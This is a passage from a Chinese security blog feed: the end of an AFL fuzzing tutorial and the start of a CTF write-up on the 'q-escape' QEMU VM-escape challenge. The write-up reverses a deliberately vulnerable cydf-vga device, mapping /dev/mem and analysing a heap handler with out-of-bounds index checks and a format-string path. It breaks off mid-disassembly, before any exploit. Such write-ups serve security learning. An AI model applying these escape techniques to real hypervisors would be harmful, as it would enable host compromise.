title="文件读取输入的情况"></a>文件读取输入的情况</h2><p>首先做以下准备</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  input_dir mkdir file</span><br><span class="line">➜  input_dir cp ../../testcases/others/elf/small_exec.elf ./file</span><br><span class="line">➜  afl_test cp /usr/bin/readelf ./</span><br></pre></td></tr></table></figure><p>随后直接进行fuzz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../afl-fuzz -i ./input_dir/file -o ./output_dir -Q ./readelf -a @@</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230318142936126.png"                      alt="image-20230318142936126"                >跑了十分钟一次crash都没有的，当然跑再久应该也是一样的，这里就不再继续跑了。</p><hr><p>参考资料:<br>    <a class="link"   href="https://xz.aliyun.com/t/4314" >https://xz.aliyun.com/t/4314<i class="fas fa-external-link-alt"></i></a><br>    <a class="link"   href="https://www.cjovi.icu/fuzzing/1138.html" >https://www.cjovi.icu/fuzzing/1138.html<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;本篇文章主要是为网鼎杯线下赛做准备，不会涉及到AFL的原理，主要的方向为AFL的使用。&lt;/p&gt;
&lt;h2 id=&quot;AFL-FUZZ介绍&quot;&gt;&lt;a</summary>
      
    
    
    
    <category term="FUZZ" scheme="https://cv196082.gitee.io/categories/FUZZ/"/>
    
    
    <category term="AFL" scheme="https://cv196082.gitee.io/tags/AFL/"/>
    
    <category term="FUZZ" scheme="https://cv196082.gitee.io/tags/FUZZ/"/>
    
  </entry>
  
  <entry>
    <title>q-escape</title>
    <link href="https://cv196082.gitee.io/2023/03/15/q-escape/"/>
    <id>https://cv196082.gitee.io/2023/03/15/q-escape/</id>
    <published>2023-03-15T08:45:50.000Z</published>
    <updated>2023-03-18T06:32:16.260Z</updated>
    
    <content type="html"><![CDATA[<p>许久没有更新，前段时间一直考试所以一直拖着了。</p><h2 id="设备分析"><a href="#设备分析" class="headerlink" title="设备分析"></a>设备分析</h2><p>首先看看开了什么保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  q-escape checksec --file=./qemu-system-x86_64 </span><br><span class="line">[*] <span class="string">&#x27;/media/psf/Home/Documents/pwn/qemu_escape/q-escape/qemu-system-x86_64&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>没有开启PIE</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">./qemu-system-x86_64 \</span><br><span class="line">-m 64 \</span><br><span class="line">-initrd ./initramfs.igz \</span><br><span class="line">-kernel ./vmlinuz-4.15.0-36-generic \</span><br><span class="line">-append <span class="string">&quot;priority=low console=ttyS0&quot;</span> \</span><br><span class="line">-nographic \</span><br><span class="line">-L ./pc-bios \</span><br><span class="line">-vga std \</span><br><span class="line">-device cydf-vga \</span><br><span class="line">-monitor telnet:127.0.0.1:2222,server,nowait</span><br></pre></td></tr></table></figure><p>设备名为<code>cydf-vga</code>并且允许连接。</p><p>将qemu-system-x86_64拖入ida中，查找与设备cydf-vga相关的函数。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315122813653.png"                      alt="image-20230315122813653"                ></p><p>先分析cydf_vga_class_init初始化函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">cydf_vga_class_init</span><span class="params">(ObjectClass_0 *klass, <span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PCIDeviceClass *v2; <span class="comment">// rbx</span></span><br><span class="line">  PCIDeviceClass *v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           klass,</span><br><span class="line">                           <span class="string">&quot;device&quot;</span>,</span><br><span class="line">                           <span class="string">&quot;/home/dr0gba/pwn/seccon/qemu-3.0.0/hw/display/cydf_vga.c&quot;</span>,</span><br><span class="line">                           <span class="number">3223</span>,</span><br><span class="line">                           <span class="string">&quot;cydf_vga_class_init&quot;</span>);</span><br><span class="line">  v3 = (PCIDeviceClass *)object_class_dynamic_cast_assert(</span><br><span class="line">                           klass,</span><br><span class="line">                           <span class="string">&quot;pci-device&quot;</span>,</span><br><span class="line">                           <span class="string">&quot;/home/dr0gba/pwn/seccon/qemu-3.0.0/hw/display/cydf_vga.c&quot;</span>,</span><br><span class="line">                           <span class="number">3224</span>,</span><br><span class="line">                           <span class="string">&quot;cydf_vga_class_init&quot;</span>);</span><br><span class="line">  v3-&gt;realize = pci_cydf_vga_realize;</span><br><span class="line">  v3-&gt;romfile = <span class="string">&quot;vgabios-cydf.bin&quot;</span>;</span><br><span class="line">  v3-&gt;vendor_id = <span class="number">0x1013</span>;</span><br><span class="line">  v3-&gt;device_id = <span class="number">0xB8</span>;</span><br><span class="line">  v3-&gt;class_id = <span class="number">0x300</span>;</span><br><span class="line">  v2-&gt;parent_class.desc = <span class="string">&quot;Cydf CLGD 54xx VGA&quot;</span>;</span><br><span class="line">  v2-&gt;parent_class.categories[<span class="number">0</span>] |= <span class="number">0x20</span>uLL;</span><br><span class="line">  v2-&gt;parent_class.vmsd = &amp;vmstate_pci_cydf_vga;</span><br><span class="line">  v2-&gt;parent_class.props = pci_vga_cydf_properties;</span><br><span class="line">  v2-&gt;parent_class.hotpluggable = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>device_id</code>为0xB8，<code>vendor_id</code>为0x1013，<code>class_id</code>为0x300。并且可以看到父类的描述为<code>Cydf CLGD 54xx VGA</code>。合理猜测是根据原本的改的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  display git:(master) grep -r <span class="string">&#x27;CLGD 54xx VGA&#x27;</span> ./ </span><br><span class="line">./cirrus_vga_rop.h: * QEMU Cirrus CLGD 54xx VGA Emulator.</span><br><span class="line">./cirrus_vga_isa.c: * QEMU Cirrus CLGD 54xx VGA Emulator, ISA bus support</span><br><span class="line">./cirrus_vga_internal.h: * QEMU Cirrus CLGD 54xx VGA Emulator, ISA bus support</span><br><span class="line">./cirrus_vga_rop2.h: * QEMU Cirrus CLGD 54xx VGA Emulator.</span><br><span class="line">./cirrus_vga.c: * QEMU Cirrus CLGD 54xx VGA Emulator.</span><br><span class="line">./cirrus_vga.c:    dc-&gt;desc = <span class="string">&quot;Cirrus CLGD 54xx VGA&quot;</span>;</span><br></pre></td></tr></table></figure><p>事实也是这样的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># lspci</span></span><br><span class="line">00:00.0 Class 0600: 8086:1237</span><br><span class="line">00:01.3 Class 0680: 8086:7113</span><br><span class="line">00:03.0 Class 0200: 8086:100e</span><br><span class="line">00:01.1 Class 0101: 8086:7010</span><br><span class="line">00:02.0 Class 0300: 1234:1111</span><br><span class="line">00:01.0 Class 0601: 8086:7000</span><br><span class="line">00:04.0 Class 0300: 1013:00b8 &lt;-- cydf_vga</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /sys/bus/pci/devices/0000\:00\:04.0/resource</span></span><br><span class="line">0x00000000fa000000 0x00000000fbffffff 0x0000000000042208</span><br><span class="line">0x00000000febc1000 0x00000000febc1fff 0x0000000000040200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x00000000febb0000 0x00000000febbffff 0x0000000000046200</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br></pre></td></tr></table></figure><p>通过这里可以看到三个mmio空间。通过交叉引用，可以找到哪里注册了IO</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315134309905.png"                      alt="image-20230315134309905"                ></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">memory_region_init_io(&amp;s-&gt;cydf_vga_io, owner, &amp;cydf_vga_io_ops, s, <span class="string">&quot;cydf-io&quot;</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">memory_region_init_io(&amp;s-&gt;low_mem, owner, &amp;cydf_vga_mem_ops, s, <span class="string">&quot;cydf-low-memory&quot;</span>, <span class="number">0x20000</span>uLL);</span><br><span class="line">memory_region_init_io(&amp;s-&gt;cydf_mmio_io, owner, &amp;cydf_mmio_io_ops, s, <span class="string">&quot;cydf-mmio&quot;</span>, <span class="number">0x1000</span>uLL);</span><br></pre></td></tr></table></figure><p>这里关注与cydf相关的空间注册，根据大小来看第一个就是pmio，只不过在resource文件内没有范围</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /proc/ioports </span></span><br><span class="line">0000-0cf7 : PCI Bus 0000:00</span><br><span class="line">  0000-001f : dma1</span><br><span class="line">  0020-0021 : pic1</span><br><span class="line">  0040-0043 : timer0</span><br><span class="line">  0050-0053 : timer1</span><br><span class="line">  0060-0060 : keyboard</span><br><span class="line">  0064-0064 : keyboard</span><br><span class="line">  0070-0071 : rtc0</span><br><span class="line">  0080-008f : dma page reg</span><br><span class="line">  00a0-00a1 : pic2</span><br><span class="line">  00c0-00df : dma2</span><br><span class="line">  00f0-00ff : fpu</span><br><span class="line">  0170-0177 : 0000:00:01.1</span><br><span class="line">    0170-0177 : ata_piix</span><br><span class="line">  01f0-01f7 : 0000:00:01.1</span><br><span class="line">    01f0-01f7 : ata_piix</span><br><span class="line">  0376-0376 : 0000:00:01.1</span><br><span class="line">    0376-0376 : ata_piix</span><br><span class="line">  03c0-03df : vga+</span><br><span class="line">  03f6-03f6 : 0000:00:01.1</span><br><span class="line">    03f6-03f6 : ata_piix</span><br><span class="line">  03f8-03ff : serial</span><br><span class="line">  0510-051b : QEMU0002:00</span><br><span class="line">  0600-063f : 0000:00:01.3</span><br><span class="line">    0600-0603 : ACPI PM1a_EVT_BLK</span><br><span class="line">    0604-0605 : ACPI PM1a_CNT_BLK</span><br><span class="line">    0608-060b : ACPI PM_TMR</span><br><span class="line">  0700-070f : 0000:00:01.3</span><br><span class="line">0cf8-0cff : PCI conf1</span><br><span class="line">0d00-ffff : PCI Bus 0000:00</span><br><span class="line">  afe0-afe3 : ACPI GPE0_BLK</span><br><span class="line">  c000-c03f : 0000:00:03.0</span><br><span class="line">  c040-c04f : 0000:00:01.1</span><br><span class="line">    c040-c04f : ata_piix</span><br></pre></td></tr></table></figure><p>可以看到这里存在一个大小刚好为0x30的vga+的端口范围。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315134724201.png"                      alt="image-20230315134724201"                ></p><p>根据定义的函数来看我们还需要找到vga的映射空间，通过这篇文章<a class="link"   href="http://www.osdever.net/FreeVGA/vga/vgamem.htm" >vgamem<i class="fas fa-external-link-alt"></i></a>可以得知vga的映射空间为<code>000a0000-000bffff</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="comment"># cat /proc/iomem </span></span><br><span class="line">00000000-00000fff : Reserved</span><br><span class="line">00001000-0009fbff : System RAM</span><br><span class="line">0009fc00-0009ffff : Reserved</span><br><span class="line">000a0000-000bffff : PCI Bus 0000:00</span><br><span class="line">000c0000-000c97ff : Video ROM</span><br><span class="line">000c9800-000ca5ff : Adapter ROM</span><br><span class="line">000ca800-000cadff : Adapter ROM</span><br><span class="line">000f0000-000fffff : Reserved</span><br><span class="line">  000f0000-000fffff : System ROM</span><br><span class="line">00100000-03fdffff : System RAM</span><br><span class="line">  01000000-01c031d0 : Kernel code</span><br><span class="line">  01c031d1-0266a03f : Kernel data</span><br><span class="line">  028e2000-02b3dfff : Kernel bss</span><br><span class="line">03fe0000-03ffffff : Reserved</span><br><span class="line">04000000-febfffff : PCI Bus 0000:00</span><br><span class="line">  fa000000-fbffffff : 0000:00:04.0</span><br><span class="line">  fc000000-fcffffff : 0000:00:02.0</span><br><span class="line">  feb40000-feb7ffff : 0000:00:03.0</span><br><span class="line">  feb80000-feb9ffff : 0000:00:03.0</span><br><span class="line">  febb0000-febbffff : 0000:00:04.0</span><br><span class="line">  febc0000-febc0fff : 0000:00:02.0</span><br><span class="line">  febc1000-febc1fff : 0000:00:04.0</span><br><span class="line">fec00000-fec003ff : IOAPIC 0</span><br><span class="line">fed00000-fed003ff : HPET 0</span><br><span class="line">  fed00000-fed003ff : PNP0103:00</span><br><span class="line">fee00000-fee00fff : Local APIC</span><br><span class="line">fffc0000-ffffffff : Reserved</span><br><span class="line">100000000-17fffffff : PCI Bus 0000:00</span><br></pre></td></tr></table></figure><p>通过注册的大小和所看到的其实地址可以确定是这里<code>000a0000-000bffff : PCI Bus 0000:00</code>。</p><p>并且在源码中也有</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***************************************</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  memory access between 0xa0000-0xbffff</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> ***************************************/</span></span><br></pre></td></tr></table></figure><p>可以看到<code>vga_mem</code>空间在resource文件中并不存在，所以无法像前面一道题一样使用resource0文件去访问内存了。这时我们可以利用<code>/dev/mem</code>文件，<code>dev/mem</code>是物理内存的全映像，可以用来访问物理内存，用mmap来访问物理内存以及外设的IO资源，是实现用户空间驱动的一种方法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">system( <span class="string">&quot;mknod -m 660 /dev/mem c 1 1&quot;</span> );</span><br><span class="line"><span class="keyword">int</span> fd = open( <span class="string">&quot;/dev/mem&quot;</span>, O_RDWR | O_SYNC );</span><br><span class="line"><span class="keyword">if</span> ( fd == <span class="number">-1</span> ) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mmio_mem = mmap( <span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0xfebc1000</span> );</span><br><span class="line"><span class="keyword">if</span> ( !mmio_mem ) &#123;</span><br><span class="line">    die(<span class="string">&quot;mmap mmio failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vga_mem = mmap( <span class="literal">NULL</span>, <span class="number">0x20000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="number">0xa0000</span> );</span><br><span class="line"><span class="keyword">if</span> ( !vga_mem ) &#123;</span><br><span class="line">    die(<span class="string">&quot;mmap vga mem failed&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h2><p>根据上一道题的流程来看，这里需要分析分析结构体了。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315135737136.png"                      alt="image-20230315135737136"                ></p><p>在对比两个结构体的结果发现了源文件中不存在<code>VulnState_0 vs[16];uint32_t latch[4];</code>这样两个属性。并且还明显的说了是<code>VulnState_0</code>。通过源码对比发现，源码中考虑地址的情况只有<code>addr &lt; 0x10000</code>，<code>addr &gt;= 0x18000 &amp;&amp; addr &lt; 0x18100</code></p><p>但是这里存在一个新的，也就是大于<code>0x18100</code>的情况。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">v5 = opaque-&gt;vga.sr[<span class="number">0xCC</span>] % <span class="number">5u</span>;</span><br><span class="line"><span class="keyword">if</span> ( *(_WORD *)&amp;opaque-&gt;vga.sr[<span class="number">0xCD</span>] )</span><br><span class="line">  LODWORD(mem_value) = (opaque-&gt;vga.sr[<span class="number">0xCD</span>] &lt;&lt; <span class="number">16</span>) | (opaque-&gt;vga.sr[<span class="number">0xCE</span>] &lt;&lt; <span class="number">8</span>) | mem_value;</span><br><span class="line"><span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v21 = BYTE2(mem_value);</span><br><span class="line">  <span class="keyword">if</span> ( v21 &lt;= <span class="number">0x10</span> &amp;&amp; opaque-&gt;vs[v21].buf )</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v5 &lt;= <span class="number">2u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( BYTE2(mem_value) &gt; <span class="number">0x10</span>uLL )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v6 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * BYTE2(mem_value);</span><br><span class="line">      v7 = *((_QWORD *)v6 + <span class="number">0x267B</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v8 = *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v6 + <span class="number">0x4CF9</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8 &gt;= *((_DWORD *)v6 + <span class="number">0x4CF8</span>) )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      LABEL_26:</span><br><span class="line">      *((_DWORD *)v6 + <span class="number">0x4CF9</span>) = v8 + <span class="number">1</span>;</span><br><span class="line">      *(_BYTE *)(v7 + v8) = mem_value;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( BYTE2(mem_value) &gt; <span class="number">0x10</span>uLL )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v6 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * BYTE2(mem_value);</span><br><span class="line">      v7 = *((_QWORD *)v6 + <span class="number">0x267B</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      v8 = *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v6 + <span class="number">19705</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v8 &gt; <span class="number">0xFFF</span> )</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">    &#125;</span><br><span class="line">    LABEL_35:</span><br><span class="line">    v17 = vulncnt;</span><br><span class="line">    <span class="keyword">if</span> ( vulncnt &lt;= <span class="number">0x10</span> &amp;&amp; (<span class="keyword">unsigned</span> __int16)mem_value &lt;= <span class="number">0x1000</span>uLL )</span><br><span class="line">    &#123;</span><br><span class="line">      mem_valuea = mem_value;</span><br><span class="line">      v18 = <span class="built_in">malloc</span>((<span class="keyword">unsigned</span> __int16)mem_value);</span><br><span class="line">      v19 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * v17;</span><br><span class="line">      *((_QWORD *)v19 + <span class="number">9851</span>) = v18;</span><br><span class="line">      <span class="keyword">if</span> ( v18 )</span><br><span class="line">      &#123;</span><br><span class="line">        vulncnt = v17 + <span class="number">1</span>;</span><br><span class="line">        *((_DWORD *)v19 + <span class="number">19704</span>) = mem_valuea;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( BYTE2(mem_value) &lt;= <span class="number">0x10</span>uLL )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = (<span class="keyword">char</span> *)opaque + <span class="number">16</span> * BYTE2(mem_value);</span><br><span class="line">    <span class="keyword">if</span> ( *((_QWORD *)v20 + <span class="number">9851</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int16)mem_value &lt;= <span class="number">0x1000</span>u )</span><br><span class="line">        *((_QWORD *)v20 + <span class="number">9852</span>) = (<span class="keyword">unsigned</span> __int16)mem_value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逆向之后会发现这里其实就是一个堆题，总共有五个选项</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v5==<span class="number">0</span>时，opaque-&gt;vs[idx].buf = <span class="built_in">malloc</span>(mem_value &amp; <span class="number">0xfff</span>); max_size == mem_value &amp; <span class="number">0xfff</span></span><br><span class="line">v5==<span class="number">1</span>时，当cur_size &lt; max_size时，opaque-&gt;vs[idx].buf[cur_size++] = mem_value &amp; <span class="number">0xff</span></span><br><span class="line">v5==<span class="number">2</span>时，printf_chk(<span class="number">1</span>, opaque-&gt;vs[idx].buf)</span><br><span class="line">v5==<span class="number">3</span>时，opaque-&gt;vs[idx].max_size = mem_value &amp; <span class="number">0xfff</span></span><br><span class="line">v5==<span class="number">4</span>时，opaque-&gt;vs[idx].buf[cur_size++] = mem_value &amp; <span class="number">0xff</span></span><br></pre></td></tr></table></figure><p>需要吐槽的是，这两次汇编语言表达的意思一样但是表达的形式不一样，所以莫名其妙的需要依靠汇编来逆向。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000068F521 48 81 C2 3D 13 00 00          add     rdx, 133Dh</span><br><span class="line">.text:000000000068F528 48 C1 E2 04                   shl     rdx, 4</span><br><span class="line">.text:000000000068F52C 48 8B 74 13 08                mov     rsi, [s+rdx+8]</span><br><span class="line">.text:000000000068F531 48 85 F6                      test    rsi, rsi</span><br><span class="line">.text:000000000068F534 0F 84 24 FD FF FF             jz      loc_68F25E</span><br><span class="line">.text:000000000068F534</span><br><span class="line">.text:000000000068F53A 48 83 C4 18                   add     rsp, 18h</span><br><span class="line">.text:000000000068F53E BF 01 00 00 00                mov     edi, 1</span><br><span class="line">.text:000000000068F543 31 